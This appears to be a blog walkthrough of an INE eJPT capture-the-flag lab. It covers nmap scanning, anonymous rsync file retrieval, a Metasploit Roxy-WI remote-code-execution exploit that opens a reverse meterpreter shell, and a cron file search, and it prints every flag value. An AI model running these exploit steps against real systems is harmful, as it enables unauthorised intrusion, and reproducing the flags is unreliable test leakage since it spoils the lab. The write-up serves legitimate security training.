---
layout: post
title: "Host & Network Penetration Testing: The Metasploit Framework CTF 2 - Complete Walkthrough"
date: 2025-07-18
categories: [Write-Ups,eJPT]
tags: [ejpt, ine, metasploit, rsync, web-exploitation, privilege-escalation]
description: "A comprehensive guide to solving the Metasploit Framework CTF 2 challenge with detailed explanations, hints, and practical examples for EJPT preparation."
---

## Introduction

Welcome to an enhanced walkthrough of the Metasploit Framework CTF 2 challenge! This is part of the eLearnSecurity Junior Penetration Tester (EJPT) certification path from INE. 

In this challenge, we'll be working with two targets and solving four flags total. This walkthrough includes helpful hints and encourages you to try things yourself before checking the solutions.

**Learning Objectives:**
- Master port scanning and service enumeration
- Understand RSYNC service exploitation
- Practice web application vulnerability assessment
- Learn privilege escalation techniques
- Explore persistence mechanisms through scheduled tasks

---

## Challenge Overview

- **Target 1:** `target1.ine.local` (Flags 1-2)
- **Target 2:** `target2.ine.local` (Flags 3-4)
- **Total Flags:** 4
- **Tools Required:** Metasploit, Nmap, RSYNC client

---

## Flag 1: RSYNC Banner Enumeration

### Challenge Description
*"Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting."*

### 🧠 Think First!
Before jumping to the solution, try these steps yourself:
1. What's the first thing you should do when approaching a new target?
2. How would you identify what services are running?
3. What information might a service banner reveal?

**Try it yourself first! If you get stuck, continue reading below.**

---

### Solution Walkthrough

#### Step 1: Initial Reconnaissance
Start with a comprehensive Nmap scan to identify open ports and services:

```bash
# Perform a detailed service scan
nmap -sC -sV target1.ine.local
```

**Expected Output:**
```
Starting Nmap 7.94 ( https://nmap.org ) at 2024-XX-XX XX:XX UTC
Nmap scan report for target1.ine.local (10.4.X.X)
Host is up (0.00XX latency).
Not shown: 999 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in X.XX seconds
```

#### Step 2: RSYNC Service Investigation
Now that we've identified RSYNC running on port 873, let's explore what modules are available:

```bash
# List available RSYNC modules
rsync rsync://target1.ine.local
```

**Command Output:**
```
root@INE:~|→
rsync rsync://target1.ine.local
backupwscohen    FLAG1_867136e537c447919d8dec554100c570
```

🎉 **Flag 1 Found:** `867136e537c447919d8dec554100c570`

### 💡 Key Learning Points
- RSYNC often reveals sensitive information in module names or descriptions
- Always check service banners and available shares/modules
- The flag was directly visible in the module listing!

---

## Flag 2: RSYNC File Content Exploration

### Challenge Description
*"The files on the RSYNC server hold valuable information. Explore the contents to find the flag."*

### 🧠 Think First!
Before checking the solution:
1. What did we discover in the previous step?
2. How can we access the contents of RSYNC modules?
3. What types of files might contain sensitive information?

**Try exploring the RSYNC module yourself first!**

---

### Solution Walkthrough

#### Step 1: Explore the RSYNC Module
From our previous discovery, we found a module named `backupwscohen`. Let's examine its contents:

```bash
# List contents of the backup module
rsync rsync://target1.ine.local/backupwscohen/
```

**Results:**
```
root@INE:~|→
rsync rsync://target1.ine.local/backupwscohen/
drwxr-xr-x       4,096 2025/01/30 21:56:12 .
-rw-r--r--          20 2024/10/28 15:05:40 TPSData.txt
-rw-r--r--          25 2024/10/28 15:05:40 office_staff.vhd
-rw-r--r--          39 2025/01/30 21:56:12 pii_data.xlsx
```

#### Step 2: Download Files for Analysis
Let's download all files to analyze them locally:

```bash
# Download all files from the RSYNC module
rsync -av rsync://target1.ine.local/backupwscohen/ .
```

**Output:**
```
root@INE:~|→
rsync -av rsync://target1.ine.local/backupwscohen/ .
receiving incremental file list
./
TPSData.txt
office_staff.vhd
pii_data.xlsx

sent 84 bytes  received 339 bytes  846.00 bytes/sec
total size is 84  speedup is 0.20
```

#### Step 3: Search for Sensitive Information
Now examine each file for potential flags or sensitive data:

```bash
# Check each file for interesting content
cat TPSData.txt
cat office_staff.vhd
cat pii_data.xlsx
```

**Scan Results:**
```
root@INE:~|→
cat TPSData.txt
Sample data for TPS

root@INE:~|→
cat office_staff.vhd
Sample office staff data

root@INE:~|→
cat pii_data.xlsx
FLAG2_04e5727f26774915904526755f731d86
```

🎉 **Flag 2 Found:** `04e5727f26774915904526755f731d86`

### 💡 Key Learning Points
- Always download and thoroughly examine accessible files
- PII (Personally Identifiable Information) files often contain hidden data
- Use `strings` command for binary files when specialized tools aren't available

---

## Flag 3: Web Application Exploitation

### Challenge Description
*"Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local."*

### 🧠 Think First!
This is a new target! Before proceeding:
1. What's your reconnaissance strategy for a new target?
2. How would you identify web applications and their technologies?
3. What's the systematic approach to finding exploits in Metasploit?

**Try the reconnaissance phase yourself first!**

---

### Solution Walkthrough

#### Step 1: Target Reconnaissance
Start fresh with the new target:

```bash
# Comprehensive scan of target2
nmap -sC -sV target2.ine.local
```

**Shell Output:**
```
root@INE:~|→
nmap -sC -sV target2.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 22:11 IST
Nmap scan report for target2.ine.local (10.4.24.216)
Host is up (0.0000055 latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; ssh-2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.52 (Ubuntu)
|_http-title: Roxy-WI
|_http-server-header: Apache/2.4.52 (Ubuntu)
| ssl-cert: Subject: commonName=roxy-wi.org/organizationName=Roxy-WI/stateOrProvinceName=Almaty/countryName=US
| ssl-cert-dates: 2020-12-14+05:20+00
|_Not valid before: 2022-07-20T00:36:04
| ssl-date: 2024-01-02+11:09+00 (Unknown)
|_http-title: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.94 seconds
```

#### Step 2: Web Application Analysis
The Nmap scan reveals **Roxy-WI** is running. This is a web-based tool for managing HAProxy, Nginx, and Apache configurations.

```bash
# You can also browse to the application
curl -I http://target2.ine.local
```

#### Step 3: Metasploit Exploit Search
Now let's search for available exploits in Metasploit:

```bash
# Launch Metasploit
msfconsole

# Search for Roxy-WI exploits
msf6 > search roxy
```

**Expected Output:**
```
Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/linux/http/roxy_wi_rce            2022-07-21       excellent  Yes    Roxy-WI 6.1.1.0 - Remote Code Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/roxy_wi_rce
```

#### Step 4: Configure and Execute the Exploit

```bash
# Select the exploit
msf6 > use 0

# Check required options
msf6 exploit(linux/http/roxy_wi_rce) > options
```

**Expected Configuration:**
```
Module options (exploit/linux/http/roxy_wi_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to Roxy-WI
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```

```bash
# Configure the exploit
msf6 exploit(linux/http/roxy_wi_rce) > set RHOSTS target2.ine.local
msf6 exploit(linux/http/roxy_wi_rce) > set LHOST YOUR_IP_ADDRESS

# Get your IP address if needed
# Run this in another terminal: ip addr show | grep inet

# Execute the exploit
msf6 exploit(linux/http/roxy_wi_rce) > exploit
```

**Expected Output:**
```
[*] Started reverse TCP handler on YOUR_IP:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Vulnerable version of Roxy-WI detected.
[*] Sending stage (3045380 bytes) to target2.ine.local
[*] Meterpreter session 1 opened (YOUR_IP:4444 -> target2.ine.local:XXXX) at 2024-XX-XX XX:XX:XX +0000

meterpreter >
```

#### Step 5: System Exploration and Flag Hunting

```bash
# Get basic system information
meterpreter > sysinfo

# Drop to system shell
meterpreter > shell

# Make the shell interactive
/bin/bash -i
```

```bash
# Check current location and navigate to root
pwd
cd /
ls
```

**Command Results:**
```
www-data@target2:/var/www/haproxy-wi/app$ cd /
cd /
www-data@target2:/$ ls
ls
bin
boot
dev
etc
flag3.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

```bash
# Read the flag
cat flag3.txt
```

**File Contents:**
```
cat flag3.txt
www-data@target2:/$ FLAG3_2b5cce2e9c1c43bb8ded07f01ca5e9fb
```

🎉 **Flag 3 Found:** `2b5cce2e9c1c43bb8ded07f01ca5e9fb`

### 💡 Key Learning Points
- Always search Metasploit's database for application-specific exploits
- Web applications often have known CVEs that can be easily exploited
- Meterpreter provides powerful post-exploitation capabilities

---

## Flag 4: Persistence Mechanism Investigation

### Challenge Description
*"Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag."*

### 🧠 Think First!
The hint mentions "automated tasks" - what comes to mind?
1. What are common ways to schedule tasks in Linux?
2. Where would you look for scheduled jobs?
3. What user contexts might run automated tasks?

**Try to explore the system's scheduled tasks yourself!**

---

### Solution Walkthrough

#### Step 1: Understanding Linux Scheduled Tasks
In Linux systems, automated tasks are commonly managed through:
- **Cron jobs** (system-wide and user-specific)
- **Systemd timers**
- **At jobs** (one-time scheduled tasks)

#### Step 2: Investigating Cron Jobs
Let's start with the most common location for cron jobs:

```bash
# Navigate to the cron configuration directory
cd /etc
ls -la | grep cron
```

**Expected Output:**
```
-rw-r--r--   1 root root   722 Feb 25  2020 crontab
drwxr-xr-x   2 root root  4096 Jul 18 10:30 cron.d
drwxr-xr-x   2 root root  4096 Jul 18 10:25 cron.daily
drwxr-xr-x   2 root root  4096 Jul 18 10:25 cron.hourly
drwxr-xr-x   2 root root  4096 Jul 18 10:25 cron.monthly
drwxr-xr-x   2 root root  4096 Jul 18 10:25 cron.weekly
```

#### Step 3: Systematic Cron Investigation

```bash
# Check the main crontab
cat crontab

# Check system-wide cron jobs in cron.d
cd cron.d
ls -la
```

**Expected Output:**
```
total 12
drwxr-xr-x  2 root root 4096 Jul 18 10:30 .
drwxr-xr-x 90 root root 4096 Jul 18 10:30 ..
-rw-r--r--  1 root root  102 Jul 18 10:30 www-data-cron
```

```bash
# Examine the suspicious cron job
cat www-data-cron
```

**Actual Terminal Output:**
```
cat www-data-cron
www-data@target2:/etc/cron.d$ * * * * * www-data echo "FLAG4_b5acc00743364f82800de0c8d2538dca"
```

🎉 **Flag 4 Found:** `b5acc00743364f82800de0c8d2538dca`

### 💡 Key Learning Points
- Cron jobs are a common persistence mechanism used by attackers
- Always check `/etc/cron.d/` for custom scheduled tasks
- Comments in cron files can contain sensitive information
- Understanding Linux job scheduling is crucial for thorough system investigation

---

## Summary and Key Takeaways

### Flags Collected
1. **Flag 1:** `867136e537c447919d8dec554100c570` (RSYNC banner enumeration)
2. **Flag 2:** `04e5727f26774915904526755f731d86` (RSYNC file content analysis)  
3. **Flag 3:** `2b5cce2e9c1c43bb8ded07f01ca5e9fb` (Web application exploitation)
4. **Flag 4:** `b5acc00743364f82800de0c8d2538dca` (Cron job investigation)

---

*Happy hacking and good luck with your EJPT certification journey! Remember: practice, document everything, and always think like an attacker while maintaining ethical standards.*